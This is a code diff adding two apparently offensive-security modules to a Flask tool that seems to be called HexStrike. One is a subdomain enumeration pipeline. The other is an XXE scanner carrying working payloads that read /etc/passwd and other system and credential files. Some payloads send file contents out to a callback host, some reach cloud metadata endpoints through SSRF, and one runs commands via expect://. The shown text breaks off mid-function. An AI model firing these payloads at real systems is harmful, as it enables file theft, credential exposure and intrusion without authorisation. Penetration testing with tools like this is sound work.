@@ -25842,6 +25842,965 @@ def websocket_test_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+class SubdomainEnumerator:
+    """
+    Multi-tool subdomain enumeration pipeline:
+    subfinder + amass + dnsx + shuffledns + alteration bruteforce,
+    wildcard DNS filtering, live host probing with httpx,
+    and optional screenshot capture with gowitness.
+    """
+
+    # Common subdomain wordlist for alteration / bruteforce
+    COMMON_SUBS = [
+        "www", "mail", "remote", "blog", "webmail", "server", "ns1", "ns2",
+        "smtp", "secure", "vpn", "api", "dev", "staging", "test", "admin",
+        "portal", "cdn", "static", "assets", "media", "img", "images",
+        "beta", "auth", "login", "app", "apps", "dashboard", "panel",
+        "internal", "intranet", "uat", "qa", "prod", "shop", "store",
+        "m", "mobile", "help", "support", "docs", "wiki", "forum",
+        "mx", "mail2", "email", "smtp", "pop", "imap", "ftp", "sftp",
+        "git", "gitlab", "github", "jenkins", "ci", "jira", "confluence",
+        "monitor", "logs", "metrics", "grafana", "kibana", "elastic",
+        "db", "database", "mysql", "postgres", "redis", "mongo",
+        "s3", "storage", "backup", "archive", "old", "new", "v2",
+        "api2", "api-v2", "api-dev", "api-staging", "api-prod",
+    ]
+
+    # Alteration templates applied to discovered subdomains
+    ALTERATION_TEMPLATES = [
+        "{sub}-dev", "{sub}-staging", "{sub}-prod", "{sub}-test",
+        "{sub}-api", "{sub}-admin", "{sub}-internal", "{sub}-beta",
+        "{sub}2", "{sub}-2", "{sub}-v2", "{sub}-old", "{sub}-new",
+        "dev-{sub}", "staging-{sub}", "test-{sub}", "api-{sub}",
+    ]
+
+    def __init__(self):
+        self._tool_cache: Dict[str, bool] = {}
+
+    def _tool_available(self, tool: str) -> bool:
+        if tool not in self._tool_cache:
+            self._tool_cache[tool] = shutil.which(tool) is not None
+        return self._tool_cache[tool]
+
+    def _run(self, cmd: List[str], timeout: int = 120) -> Tuple[str, str, int]:
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+            return r.stdout, r.stderr, r.returncode
+        except subprocess.TimeoutExpired:
+            return "", "timeout", 1
+        except Exception as e:
+            return "", str(e), 1
+
+    def _parse_lines(self, output: str) -> List[str]:
+        return [
+            line.strip().lower()
+            for line in output.splitlines()
+            if line.strip() and not line.startswith("#")
+        ]
+
+    # ------------------------------------------------------------------ tool checks
+    def _tools_status(self) -> Dict[str, bool]:
+        tools = ["subfinder", "amass", "dnsx", "shuffledns", "httpx",
+                 "gowitness", "massdns"]
+        return {t: self._tool_available(t) for t in tools}
+
+    # ------------------------------------------------------------------ stage 1: passive enumeration
+    def _run_subfinder(self, domain: str, timeout: int = 60) -> List[str]:
+        if not self._tool_available("subfinder"):
+            return []
+        out, _, _ = self._run(
+            ["subfinder", "-d", domain, "-silent", "-all", "-t", "50"],
+            timeout=timeout,
+        )
+        return self._parse_lines(out)
+
+    def _run_amass_passive(self, domain: str, timeout: int = 120) -> List[str]:
+        if not self._tool_available("amass"):
+            return []
+        out, _, _ = self._run(
+            ["amass", "enum", "-passive", "-d", domain, "-silent", "-timeout", "2"],
+            timeout=timeout,
+        )
+        return self._parse_lines(out)
+
+    def _run_crt_sh(self, domain: str) -> List[str]:
+        """Passive cert transparency enumeration via crt.sh (no tool required)."""
+        results = []
+        try:
+            r = requests.get(
+                f"https://crt.sh/?q=%.{domain}&output=json",
+                timeout=15,
+                headers={"User-Agent": "Mozilla/5.0"},
+            )
+            if r.status_code == 200:
+                data = r.json()
+                for entry in data:
+                    for name in entry.get("name_value", "").splitlines():
+                        name = name.strip().lower().lstrip("*.")
+                        if name.endswith(f".{domain}") or name == domain:
+                            results.append(name)
+        except Exception:
+            pass
+        return list(set(results))
+
+    def _run_hackertarget(self, domain: str) -> List[str]:
+        """HackerTarget passive API (no key required)."""
+        results = []
+        try:
+            r = requests.get(
+                f"https://api.hackertarget.com/hostsearch/?q={domain}",
+                timeout=10,
+            )
+            if r.status_code == 200 and "error" not in r.text.lower():
+                for line in r.text.splitlines():
+                    parts = line.split(",")
+                    if parts:
+                        sub = parts[0].strip().lower()
+                        if sub.endswith(f".{domain}"):
+                            results.append(sub)
+        except Exception:
+            pass
+        return results
+
+    # ------------------------------------------------------------------ stage 2: DNS resolution + wildcard filter
+    def _detect_wildcard(self, domain: str) -> Optional[str]:
+        """
+        Check if the domain has wildcard DNS by resolving a random subdomain.
+        Returns the wildcard IP if detected, else None.
+        """
+        import random, string
+        rand_sub = "".join(random.choices(string.ascii_lowercase, k=12)) + f".{domain}"
+        try:
+            result = socket.getaddrinfo(rand_sub, None, socket.AF_INET)
+            if result:
+                return result[0][4][0]
+        except Exception:
+            pass
+        return None
+
+    def _resolve_batch_dnsx(self, subdomains: List[str], threads: int = 100) -> List[Dict]:
+        """Resolve a batch of subdomains using dnsx."""
+        if not subdomains:
+            return []
+        if not self._tool_available("dnsx"):
+            return self._resolve_batch_fallback(subdomains)
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+            f.write("\n".join(subdomains))
+            fname = f.name
+        try:
+            out, _, _ = self._run(
+                ["dnsx", "-l", fname, "-resp", "-a", "-cname", "-silent",
+                 "-t", str(threads), "-json"],
+                timeout=120,
+            )
+            results = []
+            for line in out.splitlines():
+                try:
+                    data = json.loads(line)
+                    results.append({
+                        "host":  data.get("host", ""),
+                        "ips":   data.get("a", []),
+                        "cname": data.get("cname", []),
+                        "alive": True,
+                    })
+                except Exception:
+                    continue
+            return results
+        finally:
+            try:
+                os.unlink(fname)
+            except Exception:
+                pass
+
+    def _resolve_batch_fallback(self, subdomains: List[str]) -> List[Dict]:
+        """Pure-Python DNS resolution fallback when dnsx is absent."""
+        results = []
+        for sub in subdomains[:200]:  # cap for speed
+            try:
+                ips = [r[4][0] for r in socket.getaddrinfo(sub, None, socket.AF_INET)]
+                if ips:
+                    results.append({"host": sub, "ips": list(set(ips)), "cname": [], "alive": True})
+            except Exception:
+                pass
+        return results
+
+    def _filter_wildcards(self, resolved: List[Dict], wildcard_ip: Optional[str]) -> List[Dict]:
+        if not wildcard_ip:
+            return resolved
+        return [r for r in resolved if wildcard_ip not in r.get("ips", [])]
+
+    # ------------------------------------------------------------------ stage 3: bruteforce with shuffledns
+    def _run_shuffledns(self, domain: str, wordlist: Optional[str] = None, timeout: int = 120) -> List[str]:
+        if not self._tool_available("shuffledns"):
+            return self._bruteforce_fallback(domain)
+
+        # Write inline wordlist if none provided
+        if not wordlist:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+                f.write("\n".join(self.COMMON_SUBS))
+                wordlist = f.name
+            cleanup = True
+        else:
+            cleanup = False
+
+        # Use a public resolver list inline
+        resolvers = [
+            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
+            "9.9.9.9", "208.67.222.222", "208.67.220.220",
+        ]
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as rf:
+            rf.write("\n".join(resolvers))
+            resolvers_file = rf.name
+
+        try:
+            out, _, _ = self._run(
+                ["shuffledns", "-d", domain, "-w", wordlist,
+                 "-r", resolvers_file, "-silent", "-t", "500"],
+                timeout=timeout,
+            )
+            return self._parse_lines(out)
+        finally:
+            if cleanup:
+                try:
+                    os.unlink(wordlist)
+                except Exception:
+                    pass
+            try:
+                os.unlink(resolvers_file)
+            except Exception:
+                pass
+
+    def _bruteforce_fallback(self, domain: str) -> List[str]:
+        """Lightweight bruteforce fallback — resolves COMMON_SUBS directly."""
+        found = []
+        for sub in self.COMMON_SUBS:
+            fqdn = f"{sub}.{domain}"
+            try:
+                socket.getaddrinfo(fqdn, None, socket.AF_INET)
+                found.append(fqdn)
+            except Exception:
+                pass
+        return found
+
+    # ------------------------------------------------------------------ stage 4: alterations
+    def _generate_alterations(self, found_subs: List[str], domain: str) -> List[str]:
+        """Generate permutation candidates from already-discovered subdomains."""
+        alterations = set()
+        # Strip domain suffix, get just the subdomain labels
+        labels = set()
+        for sub in found_subs:
+            prefix = sub[: -(len(domain) + 1)] if sub.endswith(f".{domain}") else sub
+            if prefix and "." not in prefix:  # only single-label
+                labels.add(prefix)
+
+        for label in list(labels)[:30]:  # cap to avoid explosion
+            for tmpl in self.ALTERATION_TEMPLATES:
+                candidate = tmpl.replace("{sub}", label) + f".{domain}"
+                alterations.add(candidate)
+
+        return list(alterations)
+
+    # ------------------------------------------------------------------ stage 5: httpx live probing
+    def _run_httpx(self, hosts: List[str], timeout: int = 60) -> List[Dict]:
+        """Probe live HTTP/HTTPS services on resolved hosts."""
+        if not hosts:
+            return []
+        if not self._tool_available("httpx"):
+            return self._httpx_fallback(hosts)
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+            f.write("\n".join(hosts))
+            fname = f.name
+        try:
+            out, _, _ = self._run(
+                ["httpx", "-l", fname, "-silent", "-json",
+                 "-title", "-status-code", "-tech-detect",
+                 "-follow-redirects", "-threads", "50",
+                 "-timeout", "5"],
+                timeout=timeout,
+            )
+            results = []
+            for line in out.splitlines():
+                try:
+                    data = json.loads(line)
+                    results.append({
+                        "url":         data.get("url", ""),
+                        "host":        data.get("host", ""),
+                        "status_code": data.get("status_code", 0),
+                        "title":       data.get("title", ""),
+                        "tech":        data.get("tech", []),
+                        "ip":          data.get("host", ""),
+                        "cdn":         data.get("cdn", False),
+                    })
+                except Exception:
+                    continue
+            return results
+        finally:
+            try:
+                os.unlink(fname)
+            except Exception:
+                pass
+
+    def _httpx_fallback(self, hosts: List[str]) -> List[Dict]:
+        """Simple HTTP HEAD probe fallback."""
+        results = []
+        for host in hosts[:50]:
+            for scheme in ("https", "http"):
+                url = f"{scheme}://{host}"
+                try:
+                    r = requests.head(url, timeout=5, allow_redirects=True, verify=False)
+                    results.append({
+                        "url":         url,
+                        "host":        host,
+                        "status_code": r.status_code,
+                        "title":       "",
+                        "tech":        [],
+                    })
+                    break
+                except Exception:
+                    continue
+        return results
+
+    # ------------------------------------------------------------------ stage 6: screenshots
+    def _run_gowitness(self, urls: List[str], output_dir: str, timeout: int = 60) -> Dict:
+        if not self._tool_available("gowitness") or not urls:
+            return {"skipped": True, "reason": "gowitness not installed or no live URLs"}
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+            f.write("\n".join(urls[:100]))
+            fname = f.name
+        try:
+            _, _, rc = self._run(
+                ["gowitness", "file", "-f", fname,
+                 "--screenshot-path", output_dir,
+                 "--timeout", "5"],
+                timeout=timeout,
+            )
+            return {
+                "captured": rc == 0,
+                "output_dir": output_dir,
+                "url_count": min(len(urls), 100),
+            }
+        finally:
+            try:
+                os.unlink(fname)
+            except Exception:
+                pass
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        domain:          str,
+        run_passive:     bool = True,
+        run_brute:       bool = True,
+        run_alterations: bool = True,
+        run_httpx:       bool = True,
+        run_screenshots: bool = False,
+        wordlist:        Optional[str] = None,
+        threads:         int  = 100,
+        screenshots_dir: str  = "",
+    ) -> Dict:
+        start       = time.time()
+        all_subs    = set()
+        source_map: Dict[str, List[str]] = {}
+
+        # ---- Stage 1: passive enumeration
+        if run_passive:
+            sources = {
+                "subfinder":    self._run_subfinder(domain),
+                "amass":        self._run_amass_passive(domain),
+                "crt_sh":       self._run_crt_sh(domain),
+                "hackertarget": self._run_hackertarget(domain),
+            }
+            for src, subs in sources.items():
+                clean = [s for s in subs if s.endswith(f".{domain}") or s == domain]
+                source_map[src] = clean
+                all_subs.update(clean)
+
+        # ---- Stage 2: wildcard detection
+        wildcard_ip = self._detect_wildcard(domain)
+
+        # ---- Stage 3: bruteforce
+        brute_subs = []
+        if run_brute:
+            brute_subs = self._run_shuffledns(domain, wordlist)
+            brute_subs = [s for s in brute_subs if s.endswith(f".{domain}")]
+            source_map["shuffledns_brute"] = brute_subs
+            all_subs.update(brute_subs)
+
+        # ---- Stage 4: alterations
+        alteration_subs = []
+        if run_alterations and all_subs:
+            alteration_candidates = self._generate_alterations(list(all_subs), domain)
+            resolved_alts = self._resolve_batch_dnsx(alteration_candidates, threads)
+            alteration_subs = [r["host"] for r in resolved_alts if r.get("alive")]
+            source_map["alterations"] = alteration_subs
+            all_subs.update(alteration_subs)
+
+        # ---- DNS resolution + wildcard filter on all subs
+        all_sub_list = sorted(all_subs)
+        resolved     = self._resolve_batch_dnsx(all_sub_list, threads)
+        resolved     = self._filter_wildcards(resolved, wildcard_ip)
+
+        live_hosts = [r["host"] for r in resolved]
+
+        # ---- Stage 5: httpx probing
+        live_services = []
+        if run_httpx and live_hosts:
+            live_services = self._run_httpx(live_hosts)
+
+        # ---- Stage 6: screenshots
+        screenshot_result = {}
+        if run_screenshots and live_services:
+            sdir = screenshots_dir or str(Path(tempfile.gettempdir()) / f"hexstrike_screenshots_{domain}")
+            os.makedirs(sdir, exist_ok=True)
+            urls = [s["url"] for s in live_services if s.get("url")]
+            screenshot_result = self._run_gowitness(urls, sdir)
+
+        return {
+            "domain":           domain,
+            "wildcard_ip":      wildcard_ip,
+            "wildcard_detected":wildcard_ip is not None,
+            "total_found":      len(all_subs),
+            "total_resolved":   len(resolved),
+            "total_live":       len(live_services),
+            "subdomains":       sorted(all_subs),
+            "resolved":         resolved,
+            "live_services":    live_services,
+            "source_counts":    {k: len(v) for k, v in source_map.items()},
+            "tools_available":  self._tools_status(),
+            "screenshots":      screenshot_result,
+            "duration_sec":     round(time.time() - start, 2),
+        }
+
+
+subdomain_enumerator = SubdomainEnumerator()
+
+
+@app.route("/api/tools/subdomain/enum", methods=["POST"])
+def subdomain_enum_route():
+    try:
+        params = request.json or {}
+        result = subdomain_enumerator.run(
+            domain=params.get("domain", ""),
+            run_passive=bool(params.get("run_passive", True)),
+            run_brute=bool(params.get("run_brute", True)),
+            run_alterations=bool(params.get("run_alterations", True)),
+            run_httpx=bool(params.get("run_httpx", True)),
+            run_screenshots=bool(params.get("run_screenshots", False)),
+            wordlist=params.get("wordlist"),
+            threads=int(params.get("threads", 100)),
+            screenshots_dir=params.get("screenshots_dir", ""),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 subdomain/enum error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+class XXEScanner:
+    """
+    XXE injection scanner: blind OOB, DTD file exfil, error-based,
+    parameter entities, SVG/DOCX/XLSX vectors, SSRF via XXE,
+    and protocol handler abuse (file://, php://, expect://).
+    """
+
+    # XML-accepting content types to probe
+    XML_CONTENT_TYPES = [
+        "application/xml",
+        "text/xml",
+        "application/xhtml+xml",
+        "application/soap+xml",
+        "application/rss+xml",
+        "application/atom+xml",
+        "application/x-www-form-urlencoded",  # some parsers accept XML in form data
+    ]
+
+    # File targets for exfiltration (Linux + Windows)
+    EXFIL_FILES = [
+        "/etc/passwd",
+        "/etc/hostname",
+        "/etc/hosts",
+        "/proc/version",
+        "/proc/self/environ",
+        "C:/Windows/win.ini",
+        "C:/Windows/System32/drivers/etc/hosts",
+        "C:/inetpub/wwwroot/web.config",
+        "file:///etc/passwd",
+    ]
+
+    # Indicators of successful XXE in response
+    SUCCESS_PATTERNS = [
+        "root:x:", "daemon:", "nobody:", "sbin",             # /etc/passwd
+        "localhost", "127.0.0.1",                             # /etc/hosts
+        "linux version", "darwin kernel",                     # /proc/version
+        "[extensions]", "[mci extensions]",                   # win.ini
+        "connectionstrings", "appsettings", "<configuration", # web.config
+        "path=", "home=", "user=",                            # /proc/self/environ
+    ]
+
+    # Error-based patterns showing parser details
+    ERROR_PATTERNS = [
+        "xml", "entity", "doctype", "dtd", "parser", "saxparser",
+        "xerces", "libxml", "expat", "javax.xml",
+        "system identifier", "external entity",
+        "failed to load", "unable to load",
+    ]
+
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"})
+
+    # ------------------------------------------------------------------ helpers
+    def _post_xml(self, url: str, xml: str, ct: str = "application/xml") -> Optional[requests.Response]:
+        try:
+            return self.session.post(
+                url,
+                data=xml.encode(),
+                headers={"Content-Type": ct},
+                timeout=12,
+                verify=False,
+                allow_redirects=True,
+            )
+        except Exception:
+            return None
+
+    def _response_contains(self, resp: Optional[requests.Response], patterns: List[str]) -> List[str]:
+        if not resp:
+            return []
+        body = (resp.text or "").lower()
+        return [p for p in patterns if p.lower() in body]
+
+    def _xml_endpoints(self, target: str) -> List[str]:
+        """
+        Discover XML-accepting endpoints on the target via a set of common paths
+        plus by probing the provided URL directly.
+        """
+        parsed = urllib.parse.urlparse(target)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
+        paths  = [
+            parsed.path or "/",
+            "/api", "/api/v1", "/api/v2",
+            "/soap", "/ws", "/service", "/services",
+            "/rss", "/feed", "/atom",
+            "/upload", "/import", "/parse",
+            "/graphql", "/xmlrpc.php",
+            "/api/xml", "/data/xml",
+        ]
+        endpoints = []
+        for path in paths:
+            url = base.rstrip("/") + path
+            # Quick probe with benign XML
+            try:
+                r = self.session.post(
+                    url,
+                    data=b"<?xml version=\"1.0\"?><test/>",
+                    headers={"Content-Type": "application/xml"},
+                    timeout=5, verify=False,
+                )
+                if r.status_code not in (404, 405, 501):
+                    endpoints.append(url)
+            except Exception:
+                pass
+        # Always include the original target
+        if target not in endpoints:
+            endpoints.insert(0, target)
+        return endpoints[:10]
+
+    # ------------------------------------------------------------------ 1. classic XXE (file read)
+    def _classic_xxe(self, url: str) -> List[Dict]:
+        findings = []
+        for filepath in self.EXFIL_FILES[:5]:
+            xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "{filepath}">
+]>
+<foo>&xxe;</foo>"""
+            for ct in self.XML_CONTENT_TYPES[:3]:
+                r     = self._post_xml(url, xml, ct)
+                hits  = self._response_contains(r, self.SUCCESS_PATTERNS)
+                if hits:
+                    findings.append({
+                        "technique":  "classic_xxe",
+                        "severity":   "CRITICAL",
+                        "url":        url,
+                        "file":       filepath,
+                        "content_type": ct,
+                        "matched":    hits,
+                        "snippet":    (r.text or "")[:300] if r else "",
+                        "detail":     f"XXE file read: '{filepath}' content reflected in response",
+                    })
+                    break  # found for this file, move to next
+        return findings
+
+    # ------------------------------------------------------------------ 2. error-based XXE
+    def _error_based_xxe(self, url: str) -> List[Dict]:
+        findings = []
+        # Malformed entity to trigger parser error with file content
+        xml = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<foo/>"""
+        r    = self._post_xml(url, xml)
+        hits = self._response_contains(r, self.SUCCESS_PATTERNS + self.ERROR_PATTERNS)
+        if hits:
+            findings.append({
+                "technique":  "error_based_xxe",
+                "severity":   "HIGH",
+                "url":        url,
+                "matched":    hits,
+                "snippet":    (r.text or "")[:300] if r else "",
+                "detail":     "Error-based XXE: parser error message reveals file content or parser details",
+            })
+        return findings
+
+    # ------------------------------------------------------------------ 3. blind OOB XXE
+    def _blind_oob_xxe(self, url: str, callback_url: str) -> List[Dict]:
+        """
+        Generate blind OOB payloads pointing to callback_url.
+        Each uses a unique token so the user can verify OOB hits.
+        """
+        if not callback_url:
+            return []
+
+        token = f"xxe_{int(time.time())}"
+        cb    = callback_url.rstrip("/") + f"/{token}"
+
+        payloads = [
+            # Basic OOB
+            (f"""<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb}">]>
+<foo>&xxe;</foo>""", "basic_oob"),
+            # Parameter entity OOB
+            (f"""<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % oob SYSTEM "{cb}">
+  %oob;
+]>
+<foo/>""", "param_entity_oob"),
+            # OOB with file inclusion
+            (f"""<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "{cb}?data=%file;">
+  %dtd;
+]>
+<foo/>""", "oob_file_exfil"),
+        ]
+
+        findings = []
+        for xml, variant in payloads:
+            r = self._post_xml(url, xml)
+            # We can't confirm OOB without monitoring the callback
+            # but we can flag if no explicit rejection
+            status = r.status_code if r else 0
+            if status not in (400, 405, 415, 500):
+                findings.append({
+                    "technique":    "blind_oob_xxe",
+                    "severity":     "HIGH",
+                    "url":          url,
+                    "variant":      variant,
+                    "callback_url": cb,
+                    "token":        token,
+                    "response_status": status,
+                    "detail":       f"Blind OOB XXE payload sent ({variant}) — monitor {cb} for HTTP callbacks",
+                    "note":         "Monitor your callback listener for requests containing the token",
+                })
+            break  # one OOB probe per endpoint is enough
+
+        return findings
+
+    # ------------------------------------------------------------------ 4. SSRF via XXE
+    def _ssrf_xxe(self, url: str) -> List[Dict]:
+        findings = []
+        ssrf_targets = [
+            "http://169.254.169.254/latest/meta-data/",        # AWS metadata
+            "http://169.254.169.254/computeMetadata/v1/",      # GCP metadata
+            "http://169.254.169.254/metadata/instance",        # Azure metadata
+            "http://127.0.0.1/",
+            "http://127.0.0.1:8080/",
+            "http://127.0.0.1:8888/",                          # HexStrike self
+            "http://localhost:6379/",                           # Redis
+        ]
+        for ssrf_target in ssrf_targets[:4]:
+            xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "{ssrf_target}">]>
+<foo>&ssrf;</foo>"""
+            r    = self._post_xml(url, xml)
+            body = (r.text or "").lower() if r else ""
+            # AWS metadata keywords
+            hit_keywords = ["ami-id", "instance-id", "computemetadata", "metadata", "azure", "127.0.0.1"]
+            hits = [k for k in hit_keywords if k in body]
+            if hits:
+                findings.append({
+                    "technique":  "ssrf_via_xxe",
+                    "severity":   "CRITICAL",
+                    "url":        url,
+                    "ssrf_target":ssrf_target,
+                    "matched":    hits,
+                    "snippet":    (r.text or "")[:300] if r else "",
+                    "detail":     f"SSRF via XXE: '{ssrf_target}' response reflected — internal network access confirmed",
+                })
+        return findings
+
+    # ------------------------------------------------------------------ 5. SVG XXE vector
+    def _svg_xxe(self, url: str) -> List[Dict]:
+        """Upload SVG with embedded XXE to image upload endpoints."""
+        findings = []
+        # Probe for upload endpoints
+        parsed  = urllib.parse.urlparse(url)
+        base    = f"{parsed.scheme}://{parsed.netloc}"
+        upload_paths = ["/upload", "/api/upload", "/image", "/avatar",
+                        "/profile/image", "/api/v1/upload", "/file/upload"]
+
+        for path in upload_paths:
+            upload_url = base.rstrip("/") + path
+            svg_payload = b"""<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ELEMENT svg ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>"""
+            try:
+                r = self.session.post(
+                    upload_url,
+                    files={"file": ("test.svg", svg_payload, "image/svg+xml")},
+                    timeout=8, verify=False,
+                )
+                hits = self._response_contains(r, self.SUCCESS_PATTERNS)
+                if hits:
+                    findings.append({
+                        "technique":  "svg_xxe",
+                        "severity":   "CRITICAL",
+                        "url":        upload_url,
+                        "matched":    hits,
+                        "snippet":    (r.text or "")[:300] if r else "",
+                        "detail":     f"SVG upload XXE: file content reflected from {upload_url}",
+                    })
+            except Exception:
+                continue
+        return findings
+
+    # ------------------------------------------------------------------ 6. Office document XXE (DOCX/XLSX)
+    def _docx_xxe(self, url: str) -> List[Dict]:
+        """
+        DOCX/XLSX are ZIP files containing XML. Build a minimal DOCX/XLSX
+        with an XXE entity and probe document upload endpoints.
+        """
+        import zipfile as zf
+        import io
+        findings = []
+
+        xxe_xml = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
+            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
+</w:document>"""
+
+        # Build minimal DOCX in memory
+        docx_buf = io.BytesIO()
+        with zf.ZipFile(docx_buf, "w", zf.ZIP_DEFLATED) as z:
+            z.writestr("[Content_Types].xml",
+                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+                       '<Default Extension="xml" ContentType="application/xml"/>'
+                       '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
+                       '</Types>')
+            z.writestr("_rels/.rels",
+                       '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+                       '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
+                       '</Relationships>')
+            z.writestr("word/document.xml", xxe_xml)
+        docx_data = docx_buf.getvalue()
+
+        parsed = urllib.parse.urlparse(url)
+        base   = f"{parsed.scheme}://{parsed.netloc}"
+        upload_paths = ["/upload", "/api/upload", "/import", "/api/import",
+                        "/documents/upload", "/file"]
+
+        for path in upload_paths:
+            upload_url = base.rstrip("/") + path
+            try:
+                r = self.session.post(
+                    upload_url,
+                    files={"file": ("test.docx", docx_data,
+                                    "application/vnd.openxmlformats-officedocument.wordprocessingml.document")},
+                    timeout=8, verify=False,
+                )
+                hits = self._response_contains(r, self.SUCCESS_PATTERNS)
+                if hits:
+                    findings.append({
+                        "technique":  "docx_xxe",
+                        "severity":   "CRITICAL",
+                        "url":        upload_url,
+                        "matched":    hits,
+                        "snippet":    (r.text or "")[:300] if r else "",
+                        "detail":     f"DOCX upload XXE: /etc/passwd content reflected from {upload_url}",
+                    })
+            except Exception:
+                continue
+        return findings
+
+    # ------------------------------------------------------------------ 7. protocol handler abuse
+    def _protocol_handler_xxe(self, url: str) -> List[Dict]:
+        findings = []
+        handlers = [
+            ("php://filter", f"""<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<foo>&xxe;</foo>"""),
+            ("expect://", f"""<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<foo>&xxe;</foo>"""),
+            ("netdoc://", f"""<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>
+<foo>&xxe;</foo>"""),
+            ("jar://", f"""<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">]>
+<foo>&xxe;</foo>"""),
+        ]
+        for handler_name, xml in handlers:
+            r    = self._post_xml(url, xml)
+            body = (r.text or "") if r else ""
+            # Base64 data (php://filter output) or direct content
+            hits = self._response_contains(r, self.SUCCESS_PATTERNS)
+            # Also check for base64-encoded /etc/passwd start (cm9vd)
+            if hits or (r and "cm9vd" in body):
+                findings.append({
+                    "technique":  "protocol_handler_xxe",
+                    "severity":   "CRITICAL",
+                    "handler":    handler_name,
+                    "url":        url,
+                    "matched":    hits if hits else ["base64_data"],
+                    "snippet":    body[:300],
+                    "detail":     f"Protocol handler '{handler_name}' accepted by XML parser",
+                })
+        return findings
+
+    # ------------------------------------------------------------------ 8. parser detection probe
+    def _detect_xml_parser(self, url: str) -> Dict:
+        """Send a valid XML request and analyse response headers/errors for parser fingerprinting."""
+        xml = '<?xml version="1.0"?><root><test>probe</test></root>'
+        r   = self._post_xml(url, xml)
+        if not r:
+            return {"detected": False}
+
+        server   = r.headers.get("Server", "")
+        powered  = r.headers.get("X-Powered-By", "")
+        body     = (r.text or "").lower()
+
+        parser_hints = []
+        for hint in ("xerces", "libxml", "expat", "msxml", "javax.xml",
+                     "saxon", "xslt", "jaxb", "xstream"):
+            if hint in body or hint in server.lower() or hint in powered.lower():
+                parser_hints.append(hint)
+
+        return {
+            "detected":     bool(parser_hints),
+            "parser_hints": parser_hints,
+            "server":       server,
+            "x_powered_by":powered,
+            "status":       r.status_code,
+        }
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        target:           str,
+        callback_url:     str  = "",
+        run_classic:      bool = True,
+        run_error:        bool = True,
+        run_oob:          bool = True,
+        run_ssrf:         bool = True,
+        run_svg:          bool = True,
+        run_docx:         bool = True,
+        run_protocols:    bool = True,
+        run_detect:       bool = True,
+        custom_endpoints: Optional[List[str]] = None,
+    ) -> Dict:
+        start    = time.time()
+        findings = []
+        extras   = {}
+
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        endpoints = custom_endpoints or self._xml_endpoints(target)
+
+        if run_detect:
+            extras["parser_detection"] = self._detect_xml_parser(endpoints[0] if endpoints else target)
+
+        for ep in endpoints:
+            if run_classic:
+                findings.extend(self._classic_xxe(ep))
+            if run_error:
+                findings.extend(self._error_based_xxe(ep))
+            if run_oob and callback_url:
+                findings.extend(self._blind_oob_xxe(ep, callback_url))
+            if run_ssrf:
+                findings.extend(self._ssrf_xxe(ep))
+            if run_protocols:
+                findings.extend(self._protocol_handler_xxe(ep))
+
+        # SVG and DOCX probing is target-level (probes upload paths)
+        if run_svg:
+            findings.extend(self._svg_xxe(target))
+        if run_docx:
+            findings.extend(self._docx_xxe(target))
+
+        sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
+        for f in findings:
+            s = f.get("severity", "INFO")
+            sev_count[s] = sev_count.get(s, 0) + 1
+
+        return {
+            "target":          target,
+            "endpoints_probed":endpoints,
